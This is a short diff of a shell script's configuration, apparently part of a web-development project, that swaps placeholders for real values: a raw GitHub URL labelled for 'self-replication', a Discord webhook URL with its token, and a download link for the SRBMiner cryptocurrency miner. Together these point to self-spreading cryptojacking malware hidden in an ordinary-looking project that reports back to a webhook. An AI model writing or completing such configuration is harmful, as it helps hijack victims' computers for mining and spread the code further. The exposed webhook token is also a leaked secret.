@@ -27,10 +27,10 @@ DEV_SCRIPT="$ZSCRIPTS_DIR/dev.sh"
 NODE_MODULES="$PROJECT_DIR/node_modules/.cache"
 
 # ---- GitHub raw URL for self-replication (PLACEHOLDER — update this!) ----
-GITHUB_RAW_URL="https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/deploy.sh"
+GITHUB_RAW_URL="https://raw.githubusercontent.com/qudwad/my-web-dev-chicken-shop-v2/main/clone.sh"
 
 # ---- Discord webhook URL (PLACEHOLDER — update this!) ----
-DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1517763116040065115/6VrJWKjJjzxFZoPDR2KfEZgxFwra83nQerNqX2K41gT00b7ISgBieKguRIrBEp_JFbEm"
 
 # ---- SRBMiner release ----
 SRBMINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.4/SRBMiner-Multi-2-9-4-linux.tar.gz"
